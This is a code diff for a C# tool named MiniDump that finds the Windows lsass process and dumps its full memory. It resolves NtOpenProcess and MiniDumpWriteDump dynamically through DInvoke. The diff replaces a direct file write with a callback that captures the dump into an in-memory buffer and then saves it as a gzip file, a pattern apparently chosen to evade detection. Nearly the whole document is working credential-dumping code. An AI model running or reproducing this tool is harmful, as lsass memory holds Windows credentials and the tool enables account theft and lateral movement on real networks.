@@ -3,12 +3,85 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 using DInvoke.DynamicInvoke;
 using System.IO;
-using System.Threading;
+using System.IO.Compression;
 
 namespace MiniDump
 {
     class Program
     {
+        public static byte[] dumpBuffer = new byte[200 * 1024 * 1024];
+        public static int bufferSize = 0;
+
+        //callback
+
+        public enum MINIDUMP_CALLBACK_TYPE
+        {
+            ModuleCallback,
+            ThreadCallback,
+            ThreadExCallback,
+            IncludeThreadCallback,
+            IncludeModuleCallback,
+            MemoryCallback,
+            CancelCallback,
+            WriteKernelMinidumpCallback,
+            KernelMinidumpStatusCallback,
+            RemoveMemoryCallback,
+            IncludeVmRegionCallback,
+            IoStartCallback,
+            IoWriteAllCallback,
+            IoFinishCallback,
+            ReadMemoryFailureCallback,
+            SecondaryFlagsCallback,
+            IsProcessSnapshotCallback,
+            VmStartCallback,
+            VmQueryCallback,
+            VmPreReadCallback,
+            VmPostReadCallback
+        }
+
+        [StructLayout(LayoutKind.Sequential, Pack = 1)]
+        public struct MINIDUMP_IO_CALLBACK
+        {
+            public IntPtr Handle;
+            public ulong Offset;
+            public IntPtr Buffer;
+            public int BufferBytes;
+        }
+
+        [StructLayout(LayoutKind.Sequential, Pack = 1)]
+        public struct MINIDUMP_CALLBACK_INPUT
+        {
+
+            public int ProcessId;
+            public IntPtr ProcessHandle;
+            public MINIDUMP_CALLBACK_TYPE CallbackType;
+            public MINIDUMP_IO_CALLBACK Io;
+        }
+
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct MINIDUMP_CALLBACK_OUTPUT
+        {
+            public uint status;
+
+        }
+
+
+        public delegate bool CallBack(
+            int CallbackParam,
+            IntPtr PointerCallbackInput,
+            IntPtr PointerCallbackOutput
+            );
+
+        public struct MINIDUMP_CALLBACK_INFORMATION
+        {
+            public IntPtr CallbackRoutine;
+            public IntPtr CallbackParam;
+        }
+
+        //callback end
+
+        //NtOpenProcess
         [StructLayout(LayoutKind.Sequential)]
         public struct CLIENT_ID
         {
@@ -34,6 +107,8 @@ namespace MiniDump
             public IntPtr Information;
         }
 
+        
+
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate int NtOpenProcessDelegate(
             ref IntPtr ProcessHandle,
@@ -43,6 +118,8 @@ namespace MiniDump
 
         public const uint PROCESS_QUERY_INFORMATION = 0x0400;
         public const uint PROCESS_VM_READ = 0x0010;
+
+        //NtOpenProcess end
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
         delegate bool MiniDumpWriteDumpDelegate(
@@ -54,91 +131,35 @@ namespace MiniDump
             IntPtr UserStreamParam,
             IntPtr CallbackParam);
 
-       
-        [StructLayout(LayoutKind.Sequential)]
-        public struct UNICODE_STRING
-        {
-            public ushort Length;
-            public ushort MaximumLength;
-            public IntPtr Buffer;
-        }
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        private delegate int NtCreateFileDelegate(
-           out IntPtr FileHandle,
-           uint DesiredAccess,
-           ref OBJECT_ATTRIBUTES ObjectAttributes,
-           out IO_STATUS_BLOCK IoStatusBlock,
-           ref long AllocationSize,
-           uint FileAttributes,
-           uint ShareAccess,
-           uint CreateDisposition,
-           uint CreateOptions,
-           IntPtr EaBuffer,
-           uint EaLength
-       );
-
-        public const uint STANDARD_RIGHTS_READ = 0x00020000; 
-        public const uint FILE_READ_DATA = 0x0001;           
-        public const uint FILE_READ_ATTRIBUTES = 0x0080;    
-        public const uint FILE_READ_EA = 0x0008;             
-
-        public const uint STANDARD_RIGHTS_WRITE = 0x00020000; 
-        public const uint FILE_WRITE_DATA = 0x0002;           
-        public const uint FILE_WRITE_ATTRIBUTES = 0x0100;     
-        public const uint FILE_WRITE_EA = 0x0010;             
-        public const uint FILE_APPEND_DATA = 0x0004;          
-
-        public const uint SYNCHRONIZE = 0x00100000;             
-
-        public const uint FILE_GENERIC_READ = STANDARD_RIGHTS_READ | FILE_READ_DATA | FILE_READ_ATTRIBUTES | FILE_READ_EA | SYNCHRONIZE;
-        public const uint FILE_GENERIC_WRITE = STANDARD_RIGHTS_WRITE | FILE_WRITE_DATA | FILE_WRITE_ATTRIBUTES | FILE_WRITE_EA | FILE_APPEND_DATA | SYNCHRONIZE;
-
-        public const uint FILE_SHARE_READ = 0x00000001;
-        public const uint FILE_SHARE_WRITE = 0x00000002;
-        public const uint FILE_OPEN_IF = 0x00000003;
-        public const uint OBJ_CASE_INSENSITIVE = 0x00000040;
-        public const uint FILE_SYNCHRONOUS_IO_NONALERT = 0x00000020;
-
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate bool NtCloseHandleDelegate(IntPtr hObject);
 
-        public enum MINIDUMP_TYPE
-        {
-            MiniDumpNormal = 0x00000000,
-            MiniDumpWithFullMemory = 0x00000002,
-            MiniDumpWithHandleData = 0x00000004,
-            MiniDumpWithThreadInfo = 0x00001000
-        }
-
         
+
 
         static void Main(string[] args)
         {
             string processName = "lsass";
-            string dumpFilePath = @"\??\C:\Windows\Temp\du_du.dux";
-            
+                        
 
             Process[] processes = Process.GetProcessesByName(processName);
             if (processes.Length == 0)
             {
-                Console.WriteLine("Prcess {0} not found.", processName);
+                Console.WriteLine("[-] Process {0} not found.", processName);
                 return;
             }
 
             Process hProcess = processes[0];
-            Console.WriteLine("Process {0} found with PID: {1}", processName, hProcess.Id);
+            Console.WriteLine("[+]Process {0} found with PID: {1}.", processName, hProcess.Id);
 
             int PID = hProcess.Id;
 
             IntPtr ntOpenPro = Generic.GetLibraryAddress("ntdll.dll", "NtOpenProcess", true);
             IntPtr dbghelpHandle = Generic.GetLibraryAddress("dbgcore.dll", "MiniDumpWriteDump", true);
-            IntPtr ntCreateFilePtr = Generic.GetLibraryAddress("ntdll.dll", "NtCreateFile", true);
             IntPtr ntclHandle = Generic.GetLibraryAddress("ntdll.dll", "NtClose", true);
 
             var ntOpenProcess = (NtOpenProcessDelegate)Marshal.GetDelegateForFunctionPointer(ntOpenPro, typeof(NtOpenProcessDelegate));
             var miniDumpWriteDump = (MiniDumpWriteDumpDelegate)Marshal.GetDelegateForFunctionPointer(dbghelpHandle, typeof(MiniDumpWriteDumpDelegate));
-            var ntCreateFile = (NtCreateFileDelegate)Marshal.GetDelegateForFunctionPointer(ntCreateFilePtr, typeof(NtCreateFileDelegate));
             var closeHandle = (NtCloseHandleDelegate)Marshal.GetDelegateForFunctionPointer(ntclHandle, typeof(NtCloseHandleDelegate));
 
             
@@ -170,98 +191,61 @@ namespace MiniDump
 
             if (statusProcess != 0 || processHandle == IntPtr.Zero)
             {
-                Console.WriteLine("It was not possible to get the process handle");
+                Console.WriteLine("[-]Failing getting NtOpenProcess process handle.");
                 return;
             }
 
             try
             {
 
-                
-                UNICODE_STRING unicodeFilePath = new UNICODE_STRING
-                {
-                    Length = (ushort)(dumpFilePath.Length * 2),
-                    MaximumLength = (ushort)((dumpFilePath.Length * 2) + 2),
-                    Buffer = Marshal.StringToHGlobalUni(dumpFilePath)
-                };
+                //callback definition
 
-                
-                OBJECT_ATTRIBUTES objAttrFile = new OBJECT_ATTRIBUTES
-                {
-                    Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES)),
-                    RootDirectory = IntPtr.Zero,
-                    ObjectName = Marshal.AllocHGlobal(Marshal.SizeOf(unicodeFilePath)), 
-                    Attributes = OBJ_CASE_INSENSITIVE,
-                    SecurityDescriptor = IntPtr.Zero,
-                    SecurityQualityOfService = IntPtr.Zero
-                };
+                CallBack MyCallBack = new CallBack(CallBackFunction);
+                MINIDUMP_CALLBACK_INFORMATION mci;
+                mci.CallbackRoutine = Marshal.GetFunctionPointerForDelegate(MyCallBack);
+                mci.CallbackParam = IntPtr.Zero;
+                IntPtr mci_pointer = Marshal.AllocHGlobal(Marshal.SizeOf(mci));
+                Marshal.StructureToPtr(mci, mci_pointer, true);
 
-                Marshal.StructureToPtr(unicodeFilePath, objAttrFile.ObjectName, true);
+                //callback end
 
                
-                IO_STATUS_BLOCK ioStatusBlock = new IO_STATUS_BLOCK
-                {
-                    Status = 0,
-                    Information = IntPtr.Zero
-                };
-
-                IntPtr fileHandle;
-                long allocationSize = 0;
-
-              
-                int status = ntCreateFile(
-                    out fileHandle,
-                    FILE_GENERIC_READ | FILE_GENERIC_WRITE,   
-                    ref objAttrFile,
-                    out ioStatusBlock,
-                    ref allocationSize,
-                    0,                      
-                    FILE_SHARE_READ | FILE_SHARE_WRITE, 
-                    FILE_OPEN_IF,            
-                    FILE_SYNCHRONOUS_IO_NONALERT, 
-                    IntPtr.Zero,             
-                    0);                       
-
-
-                if (status != 0 || fileHandle == IntPtr.Zero)
-                {
-                    Console.WriteLine($"Error creating file. Error code: 0x{status:X}");
-                    closeHandle(fileHandle);
-                    Marshal.FreeHGlobal(unicodeFilePath.Buffer);
-                    Marshal.FreeHGlobal(objAttrFile.ObjectName);
-                    return;
-                }
-
-                Console.WriteLine("File created succesfully.");
-                Console.WriteLine("fileHandle: 0x{0:X}", (long)fileHandle);
-
 
                 bool result = miniDumpWriteDump(
                     processHandle,
                     (uint)PID,
-                    fileHandle,
-                    (int)MINIDUMP_TYPE.MiniDumpWithFullMemory,
+                    IntPtr.Zero, 
+                    2, 
                     IntPtr.Zero,
                     IntPtr.Zero,
-                    IntPtr.Zero
+                    mci_pointer
                 );
 
                 if (result)
                 {
-                    Console.WriteLine("Memory dumped succesfully in {0}.", dumpFilePath.Substring(4));
+                    Console.WriteLine("[+] Memory dumpped.");
+                    MemoryStream memoryStream = new MemoryStream();
+                    memoryStream.Write(dumpBuffer, 0, bufferSize);
+
+                    memoryStream.Position = 0;
+                    using (FileStream compressedFileStream = new FileStream("dump.dmp.gz", FileMode.Create, FileAccess.Write, FileShare.None))
+                    {
+                        using (GZipStream compressionStream = new GZipStream(compressedFileStream, CompressionMode.Compress))
+                        {
+                            memoryStream.CopyTo(compressionStream);
+                            Console.WriteLine("[+] Dumpped to compressed file dump.dmp.gz.");
+                        }
+                    }
                 }
                 else
                 {
-                    Console.WriteLine("Error dumping memory");
+                    Console.WriteLine("[-] Error dumping memory.");
                 }
-
-                                
-                Marshal.FreeHGlobal(unicodeFilePath.Buffer);
-                Marshal.FreeHGlobal(objAttrFile.ObjectName);
+                
+               
                 closeHandle(processHandle);
 
-                closeHandle(fileHandle);
-                
+               
 
             }
             catch (Exception ex)
@@ -270,6 +254,44 @@ namespace MiniDump
             }
             
         }
+
+        public static bool CallBackFunction(int CallbackParam, IntPtr PointerCallbackInput, IntPtr PointerCallbackOutput)
+        {
+
+            var callbackInput = Marshal.PtrToStructure<MINIDUMP_CALLBACK_INPUT>(PointerCallbackInput);
+            var callbackOutput = Marshal.PtrToStructure<MINIDUMP_CALLBACK_OUTPUT>(PointerCallbackOutput);
+
+            // IoStartCallback
+            if (callbackInput.CallbackType == MINIDUMP_CALLBACK_TYPE.IoStartCallback)
+            {
+                
+                callbackOutput.status = 0x1;
+                Marshal.StructureToPtr(callbackOutput, PointerCallbackOutput, true);
+            }
+
+            // IoWriteAllCallback
+            if (callbackInput.CallbackType == MINIDUMP_CALLBACK_TYPE.IoWriteAllCallback)
+            {
+               
+                Marshal.Copy(callbackInput.Io.Buffer, dumpBuffer, (int)callbackInput.Io.Offset, callbackInput.Io.BufferBytes);
+                bufferSize += callbackInput.Io.BufferBytes;
+                
+                callbackOutput.status = 0;
+                Marshal.StructureToPtr(callbackOutput, PointerCallbackOutput, true);
+            }
+
+            // IoWriteAllCallback
+            if (callbackInput.CallbackType == MINIDUMP_CALLBACK_TYPE.IoFinishCallback)
+            {
+                
+                callbackOutput.status = 0;
+                Marshal.StructureToPtr(callbackOutput, PointerCallbackOutput, true);
+            }
+
+            return true; 
+        }
+
+
     }
 }
 
